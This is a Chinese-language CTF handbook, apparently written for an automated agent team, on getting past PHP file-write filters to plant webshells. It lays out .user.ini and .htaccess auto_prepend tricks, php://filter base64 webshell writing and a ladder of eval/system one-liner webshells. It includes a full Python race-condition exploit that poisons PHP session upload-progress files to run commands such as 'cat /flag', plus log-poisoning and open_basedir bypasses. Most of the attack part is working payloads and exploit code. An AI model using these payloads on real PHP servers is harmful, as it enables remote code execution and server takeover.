# PHP 文件写入 WAF 绕过（file_put_contents 类）

适用：题目给你任意/半任意文件写入（ctf.show 文件写入系列是典型），
`waf_file($filename)` 过滤后缀、`waf_content($content)` 过滤内容，目标通常是
写 webshell 或直接读 flag。本手册按"先测绘、再选路线"组织。

## 0. 先判断 WAF 在哪一层

- `waf_file`：禁 `.php`/`.phtml`/`ph`/`htaccess`/`user.ini` 等子串（常见于文件名）。
- `waf_content`：禁 `<?`、`php`、`eval`、`system`、FLAG 关键字等。
- 过滤函数多为 `preg_match('/.../i', $x)` 或 `stripos`。看到 `preg_match` 就
  立刻想到**数组绕过**（见 §6）。

## 1. 规则测绘（不要猜，逐条验证）

写一个测绘脚本（python_eval 或 requests 脚本），对写入接口跑三批探针：

1. **逐字符/逐子串**：`a.php`、`a.phpx`、`a.pHp`、`a.htaccess`、`.user.ini`、
   `a.php.`、`a.php `（尾空格）、`a.php::$DATA`，每个提交一次，记录哪个被拦、
   哪个写成功。被拦的响应和成功的响应必须存证（post_fact）。
2. **长度限制**：文件名从 8 到 256 递增，找截断点。有截断就有
   "截断绕过后缀"（长名字把 `.txt` 顶掉留下 `.php`）的可能。
3. **内容过滤清单**：`<?`、`<?php`、`<?=`、`script`、`php`、`eval`、
   反引号、`_GET`，逐个探测。`<?=` 经常漏网；`<?xml` 可混淆。

每测完一条把结论 post_fact / post_deadend，别重复测。

## 2. .user.ini 路线（首选，CTF 高频正解）

PHP 的 per-dir 配置：`.user.ini` 里 `auto_prepend_file=xxx` 会让同目录
**每个 PHP 请求**先包含 xxx。条件：PHP 以 CGI/FastCGI 跑（nginx+php-fpm 典型），
且你能控制一个**会被访问到的 PHP 页面**。

1. 写 `.user.ini`，内容如 `auto_prepend_file=/tmp/x` 或 `auto_prepend_file=a.jpg`。
2. 写载体文件 a.jpg，内容是马（内容 waf 对 .jpg 往往松）。
3. **关键坑：`.user.ini` 有缓存 TTL**（`user_ini.cache_ttl`，默认 300s）。
   写完不是立刻生效！写个轮询脚本每 2-5s 访问目标 PHP 页面，直到响应里
   出现马的输出为止（赛场上实测常常 1-5 分钟内生效，也有题目把 TTL 调成 1s）。
4. `waf_file` 拦了 `user.ini` 子串？试：`/.user.ini`、`.user.ini\x00`（旧版）、
   大小写（Linux 文件系统敏感但 waf 用 /i 时没戏）、先写 `x.user.ini` 再改名
   （如果题目有 rename 功能）。

## 3. .htaccess 路线（Apache）

能写 `.htaccess` 时：

```apache
AddType application/x-httpd-php .jpg      # 把 .jpg 当 PHP 解析
php_value auto_prepend_file /tmp/x        # 或等价 auto_prepend
```

罕见变体：`SetHandler application/x-httpd-php`。前提 Apache + AllowOverride
不为 None。nginx 下 .htaccess 完全无效，先确认服务器（响应头 Server）。

## 4. php://filter 写马（内容 waf 克星）

`file_put_contents($f, $c)` 中如果 `$c` 可控且不过滤协议，或者文件名可控：

- 文件名注入 filter 链（一些题允许）：
  `php://filter/convert.base64-decode/resource=shell.php`，
  内容写 base64 的马 → 落盘即解码好的 `<?php ... ?>`。**内容 waf 看到的是
  base64，全绕过**。注意 base64 串里不能有空格/换行污染，必要时用
  `convert.base64-decode` 前补垃圾字符对齐 4 的倍数。
- 只控内容时：直接传 base64，让另一个已存在的 filter 点解码。

写马内容优先级（内容 waf 越来越严时的降序替代）：
`<?=@eval($_POST[0]);?>` → `<?=$_GET[0]($_GET[1]);?>` →
`<?=include$_GET[0];?>` → 无 `php` 字母的 `<?=` 短标签。

## 5. PHP session upload progress 竞争包含（核武，正解高频）

**原理**：php.ini 里 `session.upload_progress.enabled` 默认开。向任意页面
POST 多文件表单并带上 `PHP_SESSION_UPLOAD_PROGRESS` 字段，PHP 会把该字段的
**值**（可含 `<?php ... ?>`）写进 `/tmp/sess_<PHPSESSID>`（或
session.save_path）。于是：

1. 固定 `PHPSESSID=foxdog123`（cookie）。
2. 先用 §2 的 `.user.ini` 写入 `auto_prepend_file=/tmp/sess_foxdog123`。
3. 然后**并发**做两件事：
   - write 线程：反复 POST 多文件上传，表单字段
     `PHP_SESSION_UPLOAD_PROGRESS = <?php system($_GET[0]); ?>`（写脏 session 文件）；
   - read 线程：反复 GET 目标 PHP 页面（触发 auto_prepend 包含 session 文件）。
4. 竞争窗口内 session 文件含有马 → 包含执行。即使 upload progress 清理逻辑
   会覆盖/清空，并发下总有一次包含到脏内容。

**exploit 脚本模板**（落成 work 区文件跑，别单行塞）：

```python
import concurrent.futures, requests, itertools

URL   = "http://target/index.php"   # 触发包含的 PHP 页面
UP    = "http://target/upload.php"  # 接收上传的页面（任意接收 POST 的页都行）
SID   = "foxdog123"
CMD   = "cat /flag"
cookies = {"PHPSESSID": SID}

def write_worker():
    for _ in range(200):
        try:
            requests.post(UP, cookies=cookies,
                files={"f": ("x.txt", b"A"*4096)},
                data={"PHP_SESSION_UPLOAD_PROGRESS": f"<?php system($_GET[0]);?>"},
                timeout=5)
        except Exception: pass

def read_worker(stop):
    for _ in range(2000):
        try:
            r = requests.get(URL, cookies=cookies, params={"0": CMD}, timeout=5)
            if "flag{" in r.text:
                print("HIT:", r.text); stop.set()
        except Exception: pass

import threading
stop = threading.Event()
with concurrent.futures.ThreadPoolExecutor(16) as ex:
    futs = [ex.submit(write_worker) for _ in range(4)]
    futs += [ex.submit(read_worker, stop) for _ in range(12)]
    concurrent.futures.wait(futs, timeout=120)
```

要点：先确认 `.user.ini` 已生效（轮询到页面行为变化）再开竞争；
`PHPSESSID` 只许字母数字；session.save_path 默认 /tmp（linux）；
打不中就把 read 线程数调大、CMD 换成 `echo MARKER` 先验证包含是否发生。

## 6. 杂项高频 trick

- **数组绕 preg_match**：`preg_match('//', $_POST['x'])` 传 `x[]=1` →
  preg_match 收到数组返回 false（!= 拦截条件），后续若直接拼字符串则
  "Array" 警告但流程继续；弱比较 `==` 下 false 常等于 0/"" 绕过判断。
- **大小写/解析差异**：Windows/部分 nginx 配置下 `a.phP` 照解析；
  `a.php/.`（路径穿越尾）、`a.php%00.jpg`（老 PHP）、双后缀 `a.php.jpg`
  配 nginx 错误 `try_files`/`fastcgi_split_path_info` 可解析。
- **竞争条件**：题目先写后删（`unlink`）的，用 §5 的并发读抢删除窗口。
- **日志包含**：写不进 Web 目录就写 UA 进 access.log，配 LFI 包含
  `/var/log/nginx/access.log`。
- 别忘了：**拿到执行后第一件事 `cat /flag` 或读 flag 文件并 post_fact**，
  候选 flag 立刻 submit_flag。

## 7. .htaccess 操作规范（允许激进，但要留后路）

往目标写 `.htaccess`（放宽 open_basedir、AddType 解析、auto_prepend 等）
是高频正路，但**一条非法指令 = Apache 全站 500，实例直接报废**：

1. 写之前先备份：`file_get_contents('/var/www/html/.htaccess')` 存本地，
   没有则记住"原本不存在"（复原 = 删除）。
2. 先探级别：`php_value` 只对 PHP_INI_PERDIR/ALL 指令有效；
   `open_basedir` 若是 `php_admin_value` 设的（phpinfo 里 Local vs Master
   值一致且改不动）则 .htaccess 改不了，别硬写，换路线（详见下文绕过）。
3. 探测是否被解析：写一条合法可观测指令（如 `php_value display_errors 1`）
   看行为变化；实例可重启的前提下，也可以故意写一条非法指令看是否 500——
   这是确认解析的最快手段，代价是实例可能报废，用前先备份、用完敢复原。
4. 写完真指令**立刻请求首页**：200 继续；5xx 马上写回备份/删除。
5. 每个 worker 注意：靶机是共享状态，别的队友可能在改同一文件——
   开工先读当前 .htaccess 内容，别覆盖别人的劳动成果。

### open_basedir 绕过路线速查（php_admin_value 级、ini_set 被禁时）
- `chdir()` 逐级上跳 + 相对路径读（老 PHP；8.x 已修，先测）。
- `glob://` 枚举（DirectoryIterator 不受 basedir 限制）。
- symlink 技巧：webroot 内建软链指向 /（部分配置可）。
- LD_PRELOAD 型：有 mail()/error_log 且能写 .so 时。
- 直接用命令执行（system/passthru 等不受 open_basedir 约束，
  disable_functions 为空时这是最短路径，别死磕 PHP 文件函数）。
